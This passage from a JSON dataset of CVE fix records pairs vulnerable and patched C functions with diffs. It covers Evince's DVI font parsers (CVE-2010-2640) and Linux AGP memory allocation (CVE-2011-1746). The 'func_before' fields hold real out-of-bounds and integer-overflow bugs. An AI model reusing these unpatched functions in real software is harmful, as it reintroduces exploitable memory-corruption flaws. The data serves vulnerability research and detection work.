TFMSCALE(scale, z, alpha, beta);\n\t\tdesign = FROUND(params->tfm_conv * design);\n\n\t\t/* compute the resolution */\n\t\thdpi = FROUND(params->mag * params->dpi * scale / design);\n\t\tvdpi = FROUND(params->mag * params->vdpi * scale / design);\n\t\tn = fuget1(p) + fuget1(p);\n\t\tname = mdvi_malloc(n + 1);\n\t\tfread(name, 1, n, p);\n\t\tname[n] = 0;\n\t\tDEBUG((DBG_FONTS, \"(vf) %s: defined font `%s' at %.1fpt (%dx%d dpi)\\n\",\n\t\t\tfont->fontname, name, \n\t\t\t(double)scale / (params->tfm_conv * 0x100000), hdpi, vdpi));\n\n\t\t/* get the font */\n\t\tref = font_reference(params, id, name, checksum, hdpi, vdpi, scale);\n\t\tif(ref == NULL) {\n\t\t\tmdvi_error(_(\"(vf) %s: could not load font `%s'\\n\"), \n\t\t\t\t   font->fontname, name);\n\t\t\tgoto error;\n\t\t}\n\t\tmdvi_free(name);\n\t\tif(last == NULL)\n\t\t\tfont->subfonts = last = ref;\n\t\telse\n\t\t\tlast->next = ref;\n\t\tref->next = NULL;\n\t\top = fuget1(p);\n\t}\n\t\n\tif(op >= DVI_FNT_DEF1 && op <= DVI_FNT_DEF4)\n\t\tgoto error;\n\n\t/* This function correctly reads both .vf and .ovf files */\n\t\n\tfont->chars = xnalloc(DviFontChar, 256);\n\tfor(i = 0; i < 256; i++)\n\t\tfont->chars[i].offset = 0;\n\tnchars = 256;\n\tloc = -1; hic = -1;\n\t/* now read the characters themselves */\n\twhile(op <= 242) {\n\t\tint\tpl;\n\t\tInt32\tcc;\n\t\tInt32\ttfm;\n\t\t\n\t\tif(op == 242) {\n\t\t\tpl = fuget4(p);\n\t\t\tcc = fuget4(p);\n\t\t\ttfm = fuget4(p);\n\t\t} else {\n\t\t\tpl = op;\n\t\t\tcc = fuget1(p);\n\t\t\ttfm = fuget3(p);\n\t\t}\n\t\tif (cc < 0 || cc > 65536) {\n\t\t\t/* TeX engines do not support char codes bigger than 65535 */\n\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),\n\t\t\t\t   font->fontname, cc);\n\t\t\tgoto error;\n\t\t}\n\t\tif(loc < 0 || cc < loc)\n\t\t\tloc = cc;\n\t\tif(hic < 0 || cc > hic)\n\t\t\thic = cc;\n\t\tif(cc >= nchars) {\n\t\t\tfont->chars = xresize(font->chars, \n\t\t\t\tDviFontChar, cc + 16);\n\t\t\tfor(i = nchars; i < cc + 16; i++)\n\t\t\t\tfont->chars[i].offset = 0;\n\t\t\tnchars = cc + 16;\n\t\t}\n\t\tif(font->chars[cc].offset) {\n\t\t\tmdvi_error(_(\"(vf) %s: character %d redefined\\n\"),\n\t\t\t\t   font->fontname, cc);\n\t\t\tgoto error;\n\t\t}\n\t\t\t\t\n\t\tDEBUG((DBG_GLYPHS, \"(vf) %s: defined character %d (macro length %d)\\n\",\n\t\t\tfont->fontname, cc, pl));\n\t\tfont->chars[cc].width = pl + 1;\n\t\tfont->chars[cc].code = cc;\n\t\tfont->chars[cc].tfmwidth = TFMSCALE(tfm, z, alpha, beta);\n\t\tfont->chars[cc].offset = mlen;\n\t\tfont->chars[cc].loaded = 1;\n\t\tif(mlen + pl + 1 > msize) {\n\t\t\tmsize = mlen + pl + 256;\n\t\t\tmacros = xresize(macros, Uchar, msize);\n\t\t}\n\t\tif(pl && fread(macros + mlen, 1, pl, p) != pl)\n\t\t\tbreak;\n\t\tmacros[mlen+pl] = DVI_EOP;\n\t\tmlen += pl + 1;\n\t\top = fuget1(p);\n\t}\n\tif(op != 248) {\n\t\tmdvi_error(_(\"(vf) %s: no postamble\\n\"), font->fontname);\n\t\tgoto error;\n\t}\n\n\t/* make macro memory just big enough */\n\tif(msize > mlen) {\n\t\tmacros = xresize(macros, Uchar, mlen);\n\t\tmsize = mlen;\n\t}\n\t\n\tDEBUG((DBG_FONTS|DBG_GLYPHS, \n\t\t\"(vf) %s: macros use %d bytes\\n\", font->fontname, msize));\n\n\tif(loc > 0 || hic < nchars-1) {\n\t\tmemmove(font->chars, font->chars + loc,\n\t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n\t\tfont->chars = xresize(font->chars,\n\t\t\tDviFontChar, hic - loc + 1);\n\t}\n\tfont->loc = loc;\n\tfont->hic = hic;\n\tfont->private = macros;\n\n\treturn 0;\n\t\nbadvf:\n\tmdvi_error(_(\"%s: File corrupted, or not a VF file.\\n\"), font->fontname);\nerror:\n\tif(font->chars)\n\t\tmdvi_free(font->chars);\n\tif(macros)\n\t\tmdvi_free(macros);\n\treturn -1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -108,6 +108,12 @@\n \t\t\tcc = fuget1(p);\n \t\t\ttfm = fuget3(p);\n \t\t}\n+\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t/* TeX engines do not support char codes bigger than 65535 */\n+\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),\n+\t\t\t\t   font->fontname, cc);\n+\t\t\tgoto error;\n+\t\t}\n \t\tif(loc < 0 || cc < loc)\n \t\t\tloc = cc;\n \t\tif(hic < 0 || cc > hic)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t\tif (cc < 0 || cc > 65536) {",
                "\t\t\t/* TeX engines do not support char codes bigger than 65535 */",
                "\t\t\tmdvi_error(_(\"(vf) %s: unexpected character %d\\n\"),",
                "\t\t\t\t   font->fontname, cc);",
                "\t\t\tgoto error;",
                "\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-2640",
        "func_name": "GNOME/evince/token",
        "description": "Array index error in the PK font parser in the dvi-backend component in Evince 2.32 and earlier allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font in conjunction with a DVI file that is processed by the thumbnailer.",
        "git_url": "https://github.com/GNOME/evince/commit/d4139205b010ed06310d14284e63114e88ec6de2",
        "commit_title": "backends: Fix several security issues in the dvi-backend.",
        "commit_text": " See CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.",
        "func_before": "static char *token(FILE *stream)\n{\n    int ch, idx;\n\n    /* skip over white space */\n    while ((ch = fgetc(stream)) == ' ' || ch == lineterm || \n            ch == ',' || ch == '\\t' || ch == ';');\n    \n    idx = 0;\n    while (ch != EOF && ch != ' ' && ch != lineterm \n           && ch != '\\t' && ch != ':' && ch != ';') \n    {\n        ident[idx++] = ch;\n        ch = fgetc(stream);\n    } /* while */\n\n    if (ch == EOF && idx < 1) return ((char *)NULL);\n    if (idx >= 1 && ch != ':' ) ungetc(ch, stream);\n    if (idx < 1 ) ident[idx++] = ch;\t/* single-character token */\n    ident[idx] = 0;\n    \n    return(ident);\t/* returns pointer to the token */\n\n}",
        "func": "static char *token(FILE *stream)\n{\n    int ch, idx;\n\n    /* skip over white space */\n    while ((ch = fgetc(stream)) == ' ' || ch == lineterm || \n            ch == ',' || ch == '\\t' || ch == ';');\n    \n    idx = 0;\n    while (ch != EOF && ch != ' ' && ch != lineterm \n           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)\n    {\n        ident[idx++] = ch;\n        ch = fgetc(stream);\n    } /* while */\n\n    if (ch == EOF && idx < 1) return ((char *)NULL);\n    if (idx >= 1 && ch != ':' ) ungetc(ch, stream);\n    if (idx < 1 ) ident[idx++] = ch;\t/* single-character token */\n    ident[idx] = 0;\n    \n    return(ident);\t/* returns pointer to the token */\n\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,7 +8,7 @@\n     \n     idx = 0;\n     while (ch != EOF && ch != ' ' && ch != lineterm \n-           && ch != '\\t' && ch != ':' && ch != ';') \n+           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)\n     {\n         ident[idx++] = ch;\n         ch = fgetc(stream);",
        "diff_line_info": {
            "deleted_lines": [
                "           && ch != '\\t' && ch != ':' && ch != ';') "
            ],
            "added_lines": [
                "           && ch != '\\t' && ch != ':' && ch != ';' && idx < MAX_NAME)"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-2640",
        "func_name": "GNOME/evince/special",
        "description": "Array index error in the PK font parser in the dvi-backend component in Evince 2.32 and earlier allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font in conjunction with a DVI file that is processed by the thumbnailer.",
        "git_url": "https://github.com/GNOME/evince/commit/d4139205b010ed06310d14284e63114e88ec6de2",
        "commit_title": "backends: Fix several security issues in the dvi-backend.",
        "commit_text": " See CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.",
        "func_before": "int\tspecial(DviContext *dvi, int opcode)\n{\n\tchar\t*s;\n\tInt32\targ;\n\t\n\targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n\ts = mdvi_malloc(arg + 1);\n\tdread(dvi, s, arg);\n\ts[arg] = 0;\n\tmdvi_do_special(dvi, s);\n\tSHOWCMD((dvi, \"XXXX\", opcode - DVI_XXX1 + 1,\n\t\t\"[%s]\", s));\n\tmdvi_free(s);\n\treturn 0;\n}",
        "func": "int\tspecial(DviContext *dvi, int opcode)\n{\n\tchar\t*s;\n\tInt32\targ;\n\t\n\targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n\tif (arg <= 0) {\n\t\tdvierr(dvi, _(\"malformed special length\\n\"));\n\t\treturn -1;\n\t}\n\ts = mdvi_malloc(arg + 1);\n\tdread(dvi, s, arg);\n\ts[arg] = 0;\n\tmdvi_do_special(dvi, s);\n\tSHOWCMD((dvi, \"XXXX\", opcode - DVI_XXX1 + 1,\n\t\t\"[%s]\", s));\n\tmdvi_free(s);\n\treturn 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,6 +4,10 @@\n \tInt32\targ;\n \t\n \targ = dugetn(dvi, opcode - DVI_XXX1 + 1);\n+\tif (arg <= 0) {\n+\t\tdvierr(dvi, _(\"malformed special length\\n\"));\n+\t\treturn -1;\n+\t}\n \ts = mdvi_malloc(arg + 1);\n \tdread(dvi, s, arg);\n \ts[arg] = 0;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\tif (arg <= 0) {",
                "\t\tdvierr(dvi, _(\"malformed special length\\n\"));",
                "\t\treturn -1;",
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-2640",
        "func_name": "GNOME/evince/pk_load_font",
        "description": "Array index error in the PK font parser in the dvi-backend component in Evince 2.32 and earlier allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font in conjunction with a DVI file that is processed by the thumbnailer.",
        "git_url": "https://github.com/GNOME/evince/commit/d4139205b010ed06310d14284e63114e88ec6de2",
        "commit_title": "backends: Fix several security issues in the dvi-backend.",
        "commit_text": " See CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.",
        "func_before": "static int pk_load_font(DviParams *unused, DviFont *font)\n{\n\tint\ti;\n\tint\tflag_byte;\n\tint\tloc, hic, maxch;\n\tInt32\tchecksum;\n\tFILE\t*p;\n#ifndef NODEBUG\n\tchar\ts[256];\n#endif\n\tlong\talpha, beta, z;\n\n\tfont->chars = xnalloc(DviFontChar, 256);\n\tp = font->in;\n\tmemzero(font->chars, 256 * sizeof(DviFontChar));\n\tfor(i = 0; i < 256; i++)\n\t\tfont->chars[i].offset = 0;\n\n\t/* check the preamble */\n\tloc = fuget1(p); hic = fuget1(p);\n\tif(loc != PK_PRE || hic != PK_ID)\n\t\tgoto badpk;\n\ti = fuget1(p);\n#ifndef NODEBUG\n\tfor(loc = 0; loc < i; loc++)\n\t\ts[loc] = fuget1(p);\n\ts[loc] = 0;\n\tDEBUG((DBG_FONTS, \"(pk) %s: %s\\n\", font->fontname, s));\n#else\n\tfseek(in, (long)i, SEEK_CUR);\n#endif\n\t/* get the design size */\n\tfont->design = fuget4(p);\n\t/* get the checksum */\n\tchecksum = fuget4(p);\n\tif(checksum && font->checksum && font->checksum != checksum) {\n\t\tmdvi_warning(_(\"%s: checksum mismatch (expected %u, got %u)\\n\"),\n\t\t\t     font->fontname, font->checksum, checksum);\n\t} else if(!font->checksum)\n\t\tfont->checksum = checksum;\n\t/* skip pixel per point ratios */\n\tfuget4(p);\n\tfuget4(p);\n\tif(feof(p))\n\t\tgoto badpk;\t\n\n\t/* now start reading the font */\n\tloc = 256; hic = -1; maxch = 256;\n\t\n\t/* initialize alpha and beta for TFM width computation */\n\tTFMPREPARE(font->scale, z, alpha, beta);\n\n\twhile((flag_byte = fuget1(p)) != PK_POST) {\n\t\tif(feof(p))\n\t\t\tbreak;\n\t\tif(flag_byte >= PK_CMD_START) {\n\t\t\tswitch(flag_byte) {\n\t\t\tcase PK_X1:\n\t\t\tcase PK_X2:\n\t\t\tcase PK_X3:\n\t\t\tcase PK_X4: {\n#ifndef NODEBUG\n\t\t\t\tchar\t*t;\n\t\t\t\tint\tn;\n\t\t\t\t\n\t\t\t\ti = fugetn(p, flag_byte - PK_X1 + 1);\n\t\t\t\tif(i < 256)\n\t\t\t\t\tt = &s[0];\n\t\t\t\telse\n\t\t\t\t\tt = mdvi_malloc(i + 1);\n\t\t\t\tfor(n = 0; n < i; n++)\n\t\t\t\t\tt[n] = fuget1(p);\n\t\t\t\tt[n] = 0;\n\t\t\t\tDEBUG((DBG_SPECIAL, \"(pk) %s: Special \\\"%s\\\"\\n\",\n\t\t\t\t\tfont->fontname, t));\n\t\t\t\tif(t != &s[0])\n\t\t\t\t\tmdvi_free(t);\n#else\n\t\t\t\ti = fugetn(p, flag_byte - PK_X1 + 1);\n\t\t\t\twhile(i-- > 0)\n\t\t\t\t\tfuget1(p);\n#endif\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase PK_Y:\n\t\t\t\ti = fuget4(p);\n\t\t\t\tDEBUG((DBG_SPECIAL, \"(pk) %s: MF special %u\\n\",\n\t\t\t\t\tfont->fontname, (unsigned)i));\n\t\t\t\tbreak;\n\t\t\tcase PK_POST:\n\t\t\tcase PK_NOOP:\n\t\t\t\tbreak;\n\t\t\tcase PK_PRE:\n\t\t\t\tmdvi_error(_(\"%s: unexpected preamble\\n\"), font->fontname);\n\t\t\t\tgoto error;\n\t\t\t}\n\t\t} else {\n\t\t\tint\tpl;\n\t\t\tint\tcc;\n\t\t\tint\tw, h;\n\t\t\tint\tx, y;\n\t\t\tint\toffset;\n\t\t\tlong\ttfm;\n\t\t\t\n\t\t\tswitch(flag_byte & 0x7) {\n\t\t\tcase 7:\n\t\t\t\tpl = fuget4(p);\n\t\t\t\tcc = fuget4(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget4(p);\n\t\t\t\tfsget4(p); /* skip dx */\n\t\t\t\tfsget4(p); /* skip dy */\n\t\t\t\tw  = fuget4(p);\n\t\t\t\th  = fuget4(p); \n\t\t\t\tx  = fsget4(p);\n\t\t\t\ty  = fsget4(p);\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\tcase 5:\n\t\t\tcase 6:\t\t\t\t\n\t\t\t\tpl = (flag_byte % 4) * 65536 + fuget2(p);\n\t\t\t\tcc = fuget1(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget3(p);\n\t\t\t\tfsget2(p); /* skip dx */\n\t\t\t\t           /* dy assumed 0 */\n\t\t\t\tw = fuget2(p);\n\t\t\t\th = fuget2(p);\n\t\t\t\tx = fsget2(p);\n\t\t\t\ty = fsget2(p);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tpl = (flag_byte % 4) * 256 + fuget1(p);\n\t\t\t\tcc = fuget1(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget3(p);\n\t\t\t\tfsget1(p); /* skip dx */\n\t\t\t\t           /* dy assumed 0 */\n\t\t\t\tw = fuget1(p);\n\t\t\t\th = fuget1(p);\n\t\t\t\tx = fsget1(p);\n\t\t\t\ty = fsget1(p);\n\t\t\t}\n\t\t\tif(feof(p))\n\t\t\t\tbreak;\n\t\t\tif(cc < loc)\n\t\t\t\tloc = cc;\n\t\t\tif(cc > hic)\n\t\t\t\thic = cc;\n\t\t\tif(cc > maxch) {\n\t\t\t\tfont->chars = xresize(font->chars, \n\t\t\t\t\tDviFontChar, cc + 16);\n\t\t\t\tfor(i = maxch; i < cc + 16; i++)\n\t\t\t\t\tfont->chars[i].offset = 0;\n\t\t\t\tmaxch = cc + 16;\n\t\t\t}\n\t\t\tfont->chars[cc].code = cc;\n\t\t\tfont->chars[cc].flags = flag_byte;\n\t\t\tfont->chars[cc].offset = ftell(p);\n\t\t\tfont->chars[cc].width = w;\n\t\t\tfont->chars[cc].height = h;\n\t\t\tfont->chars[cc].glyph.data = NULL;\n\t\t\tfont->chars[cc].x = x;\n\t\t\tfont->chars[cc].y = y;\n\t\t\tfont->chars[cc].glyph.x = x;\n\t\t\tfont->chars[cc].glyph.y = y;\n\t\t\tfont->chars[cc].glyph.w = w;\n\t\t\tfont->chars[cc].glyph.h = h;\n\t\t\tfont->chars[cc].grey.data = NULL;\n\t\t\tfont->chars[cc].shrunk.data = NULL;\n\t\t\tfont->chars[cc].tfmwidth = TFMSCALE(z, tfm, alpha, beta);\n\t\t\tfont->chars[cc].loaded = 0;\n\t\t\tfseek(p, (long)offset, SEEK_SET);\n\t\t}\n\t}\n\tif(flag_byte != PK_POST) {\n\t\tmdvi_error(_(\"%s: unexpected end of file (no postamble)\\n\"),\n\t\t\t   font->fontname);\n\t\tgoto error;\n\t}\n\twhile((flag_byte = fuget1(p)) != EOF) {\n\t\tif(flag_byte != PK_NOOP) {\n\t\t\tmdvi_error(_(\"invalid PK file! (junk in postamble)\\n\"));\n\t\t\tgoto error;\n\t\t}\n\t}\n\n\t/* resize font char data */\n\tif(loc > 0 || hic < maxch-1) {\n\t\tmemmove(font->chars, font->chars + loc, \n\t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n\t\tfont->chars = xresize(font->chars,\n\t\t\tDviFontChar, hic - loc + 1);\n\t}\n\tfont->loc = loc;\n\tfont->hic = hic;\t\t\n\treturn 0;\n\nbadpk:\n\tmdvi_error(_(\"%s: File corrupted, or not a PK file\\n\"), font->fontname);\nerror:\n\tmdvi_free(font->chars);\n\tfont->chars = NULL;\n\tfont->loc = font->hic = 0;\n\treturn -1;\n}",
        "func": "static int pk_load_font(DviParams *unused, DviFont *font)\n{\n\tint\ti;\n\tint\tflag_byte;\n\tint\tloc, hic, maxch;\n\tInt32\tchecksum;\n\tFILE\t*p;\n#ifndef NODEBUG\n\tchar\ts[256];\n#endif\n\tlong\talpha, beta, z;\n\n\tfont->chars = xnalloc(DviFontChar, 256);\n\tp = font->in;\n\tmemzero(font->chars, 256 * sizeof(DviFontChar));\n\tfor(i = 0; i < 256; i++)\n\t\tfont->chars[i].offset = 0;\n\n\t/* check the preamble */\n\tloc = fuget1(p); hic = fuget1(p);\n\tif(loc != PK_PRE || hic != PK_ID)\n\t\tgoto badpk;\n\ti = fuget1(p);\n#ifndef NODEBUG\n\tfor(loc = 0; loc < i; loc++)\n\t\ts[loc] = fuget1(p);\n\ts[loc] = 0;\n\tDEBUG((DBG_FONTS, \"(pk) %s: %s\\n\", font->fontname, s));\n#else\n\tfseek(in, (long)i, SEEK_CUR);\n#endif\n\t/* get the design size */\n\tfont->design = fuget4(p);\n\t/* get the checksum */\n\tchecksum = fuget4(p);\n\tif(checksum && font->checksum && font->checksum != checksum) {\n\t\tmdvi_warning(_(\"%s: checksum mismatch (expected %u, got %u)\\n\"),\n\t\t\t     font->fontname, font->checksum, checksum);\n\t} else if(!font->checksum)\n\t\tfont->checksum = checksum;\n\t/* skip pixel per point ratios */\n\tfuget4(p);\n\tfuget4(p);\n\tif(feof(p))\n\t\tgoto badpk;\t\n\n\t/* now start reading the font */\n\tloc = 256; hic = -1; maxch = 256;\n\t\n\t/* initialize alpha and beta for TFM width computation */\n\tTFMPREPARE(font->scale, z, alpha, beta);\n\n\twhile((flag_byte = fuget1(p)) != PK_POST) {\n\t\tif(feof(p))\n\t\t\tbreak;\n\t\tif(flag_byte >= PK_CMD_START) {\n\t\t\tswitch(flag_byte) {\n\t\t\tcase PK_X1:\n\t\t\tcase PK_X2:\n\t\t\tcase PK_X3:\n\t\t\tcase PK_X4: {\n#ifndef NODEBUG\n\t\t\t\tchar\t*t;\n\t\t\t\tint\tn;\n\t\t\t\t\n\t\t\t\ti = fugetn(p, flag_byte - PK_X1 + 1);\n\t\t\t\tif(i < 256)\n\t\t\t\t\tt = &s[0];\n\t\t\t\telse\n\t\t\t\t\tt = mdvi_malloc(i + 1);\n\t\t\t\tfor(n = 0; n < i; n++)\n\t\t\t\t\tt[n] = fuget1(p);\n\t\t\t\tt[n] = 0;\n\t\t\t\tDEBUG((DBG_SPECIAL, \"(pk) %s: Special \\\"%s\\\"\\n\",\n\t\t\t\t\tfont->fontname, t));\n\t\t\t\tif(t != &s[0])\n\t\t\t\t\tmdvi_free(t);\n#else\n\t\t\t\ti = fugetn(p, flag_byte - PK_X1 + 1);\n\t\t\t\twhile(i-- > 0)\n\t\t\t\t\tfuget1(p);\n#endif\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tcase PK_Y:\n\t\t\t\ti = fuget4(p);\n\t\t\t\tDEBUG((DBG_SPECIAL, \"(pk) %s: MF special %u\\n\",\n\t\t\t\t\tfont->fontname, (unsigned)i));\n\t\t\t\tbreak;\n\t\t\tcase PK_POST:\n\t\t\tcase PK_NOOP:\n\t\t\t\tbreak;\n\t\t\tcase PK_PRE:\n\t\t\t\tmdvi_error(_(\"%s: unexpected preamble\\n\"), font->fontname);\n\t\t\t\tgoto error;\n\t\t\t}\n\t\t} else {\n\t\t\tint\tpl;\n\t\t\tint\tcc;\n\t\t\tint\tw, h;\n\t\t\tint\tx, y;\n\t\t\tint\toffset;\n\t\t\tlong\ttfm;\n\t\t\t\n\t\t\tswitch(flag_byte & 0x7) {\n\t\t\tcase 7:\n\t\t\t\tpl = fuget4(p);\n\t\t\t\tcc = fuget4(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget4(p);\n\t\t\t\tfsget4(p); /* skip dx */\n\t\t\t\tfsget4(p); /* skip dy */\n\t\t\t\tw  = fuget4(p);\n\t\t\t\th  = fuget4(p); \n\t\t\t\tx  = fsget4(p);\n\t\t\t\ty  = fsget4(p);\n\t\t\t\tbreak;\n\t\t\tcase 4:\n\t\t\tcase 5:\n\t\t\tcase 6:\t\t\t\t\n\t\t\t\tpl = (flag_byte % 4) * 65536 + fuget2(p);\n\t\t\t\tcc = fuget1(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget3(p);\n\t\t\t\tfsget2(p); /* skip dx */\n\t\t\t\t           /* dy assumed 0 */\n\t\t\t\tw = fuget2(p);\n\t\t\t\th = fuget2(p);\n\t\t\t\tx = fsget2(p);\n\t\t\t\ty = fsget2(p);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tpl = (flag_byte % 4) * 256 + fuget1(p);\n\t\t\t\tcc = fuget1(p);\n\t\t\t\toffset = ftell(p) + pl;\n\t\t\t\ttfm = fuget3(p);\n\t\t\t\tfsget1(p); /* skip dx */\n\t\t\t\t           /* dy assumed 0 */\n\t\t\t\tw = fuget1(p);\n\t\t\t\th = fuget1(p);\n\t\t\t\tx = fsget1(p);\n\t\t\t\ty = fsget1(p);\n\t\t\t}\n\t\t\tif(feof(p))\n\t\t\t\tbreak;\n\n\t\t\t/* Although the PK format support bigger char codes,\n                         * XeTeX and other extended TeX engines support charcodes up to\n                         * 65536, while normal TeX engine supports only charcode up to 255.*/\n\t\t\tif (cc < 0 || cc > 65536) {\n\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),\n\t\t\t\t\t    font->fontname,cc);\n\t\t\t\tgoto error;\n\t\t\t} \n\t\t\tif(cc < loc)\n\t\t\t\tloc = cc;\n\t\t\tif(cc > hic)\n\t\t\t\thic = cc;\n\t\t\tif(cc > maxch) {\n\t\t\t\tfont->chars = xresize(font->chars, \n\t\t\t\t\tDviFontChar, cc + 16);\n\t\t\t\tfor(i = maxch; i < cc + 16; i++)\n\t\t\t\t\tfont->chars[i].offset = 0;\n\t\t\t\tmaxch = cc + 16;\n\t\t\t}\n\t\t\tfont->chars[cc].code = cc;\n\t\t\tfont->chars[cc].flags = flag_byte;\n\t\t\tfont->chars[cc].offset = ftell(p);\n\t\t\tfont->chars[cc].width = w;\n\t\t\tfont->chars[cc].height = h;\n\t\t\tfont->chars[cc].glyph.data = NULL;\n\t\t\tfont->chars[cc].x = x;\n\t\t\tfont->chars[cc].y = y;\n\t\t\tfont->chars[cc].glyph.x = x;\n\t\t\tfont->chars[cc].glyph.y = y;\n\t\t\tfont->chars[cc].glyph.w = w;\n\t\t\tfont->chars[cc].glyph.h = h;\n\t\t\tfont->chars[cc].grey.data = NULL;\n\t\t\tfont->chars[cc].shrunk.data = NULL;\n\t\t\tfont->chars[cc].tfmwidth = TFMSCALE(z, tfm, alpha, beta);\n\t\t\tfont->chars[cc].loaded = 0;\n\t\t\tfseek(p, (long)offset, SEEK_SET);\n\t\t}\n\t}\n\tif(flag_byte != PK_POST) {\n\t\tmdvi_error(_(\"%s: unexpected end of file (no postamble)\\n\"),\n\t\t\t   font->fontname);\n\t\tgoto error;\n\t}\n\twhile((flag_byte = fuget1(p)) != EOF) {\n\t\tif(flag_byte != PK_NOOP) {\n\t\t\tmdvi_error(_(\"invalid PK file! (junk in postamble)\\n\"));\n\t\t\tgoto error;\n\t\t}\n\t}\n\n\t/* resize font char data */\n\tif(loc > 0 && hic < maxch-1) {\n\t\tmemmove(font->chars, font->chars + loc, \n\t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n\t\tfont->chars = xresize(font->chars,\n\t\t\tDviFontChar, hic - loc + 1);\n\t}\n\tfont->loc = loc;\n\tfont->hic = hic;\t\t\n\treturn 0;\n\nbadpk:\n\tmdvi_error(_(\"%s: File corrupted, or not a PK file\\n\"), font->fontname);\nerror:\n\tmdvi_free(font->chars);\n\tfont->chars = NULL;\n\tfont->loc = font->hic = 0;\n\treturn -1;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -143,6 +143,15 @@\n \t\t\t}\n \t\t\tif(feof(p))\n \t\t\t\tbreak;\n+\n+\t\t\t/* Although the PK format support bigger char codes,\n+                         * XeTeX and other extended TeX engines support charcodes up to\n+                         * 65536, while normal TeX engine supports only charcode up to 255.*/\n+\t\t\tif (cc < 0 || cc > 65536) {\n+\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),\n+\t\t\t\t\t    font->fontname,cc);\n+\t\t\t\tgoto error;\n+\t\t\t} \n \t\t\tif(cc < loc)\n \t\t\t\tloc = cc;\n \t\t\tif(cc > hic)\n@@ -186,7 +195,7 @@\n \t}\n \n \t/* resize font char data */\n-\tif(loc > 0 || hic < maxch-1) {\n+\tif(loc > 0 && hic < maxch-1) {\n \t\tmemmove(font->chars, font->chars + loc, \n \t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n \t\tfont->chars = xresize(font->chars,",
        "diff_line_info": {
            "deleted_lines": [
                "\tif(loc > 0 || hic < maxch-1) {"
            ],
            "added_lines": [
                "",
                "\t\t\t/* Although the PK format support bigger char codes,",
                "                         * XeTeX and other extended TeX engines support charcodes up to",
                "                         * 65536, while normal TeX engine supports only charcode up to 255.*/",
                "\t\t\tif (cc < 0 || cc > 65536) {",
                "\t\t\t\tmdvi_error (_(\"%s: unexpected charcode (%d)\\n\"),",
                "\t\t\t\t\t    font->fontname,cc);",
                "\t\t\t\tgoto error;",
                "\t\t\t} ",
                "\tif(loc > 0 && hic < maxch-1) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-1746",
        "func_name": "torvalds/linux/agp_create_user_memory",
        "description": "Multiple integer overflows in the (1) agp_allocate_memory and (2) agp_create_user_memory functions in drivers/char/agp/generic.c in the Linux kernel before 2.6.38.5 allow local users to trigger buffer overflows, and consequently cause a denial of service (system crash) or possibly have unspecified other impact, via vectors related to calls that specify a large number of memory pages.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=b522f02184b413955f3bc952e3776ce41edc6355",
        "commit_title": "page_count is copied from userspace.  agp_allocate_memory() tries to",
        "commit_text": "check whether this number is too big, but doesn't take into account the wrap case.  Also agp_create_user_memory() doesn't check whether alloc_size is calculated from num_agp_pages variable without overflow. This may lead to allocation of too small buffer with following buffer overflow.  Another problem in agp code is not addressed in the patch - kernel memory exhaustion (AGPIOC_RESERVE and AGPIOC_ALLOCATE ioctls).  It is not checked whether requested pid is a pid of the caller (no check in agpioc_reserve_wrap()). Each allocation is limited to 16KB, though, there is no per-process limit. This might lead to OOM situation, which is not even solved in case of the caller death by OOM killer - the memory is allocated for another (faked) process.  ",
        "func_before": "static struct agp_memory *agp_create_user_memory(unsigned long num_agp_pages)\n{\n\tstruct agp_memory *new;\n\tunsigned long alloc_size = num_agp_pages*sizeof(struct page *);\n\n\tnew = kzalloc(sizeof(struct agp_memory), GFP_KERNEL);\n\tif (new == NULL)\n\t\treturn NULL;\n\n\tnew->key = agp_get_key();\n\n\tif (new->key < 0) {\n\t\tkfree(new);\n\t\treturn NULL;\n\t}\n\n\tagp_alloc_page_array(alloc_size, new);\n\n\tif (new->pages == NULL) {\n\t\tagp_free_key(new->key);\n\t\tkfree(new);\n\t\treturn NULL;\n\t}\n\tnew->num_scratch_pages = 0;\n\treturn new;\n}",
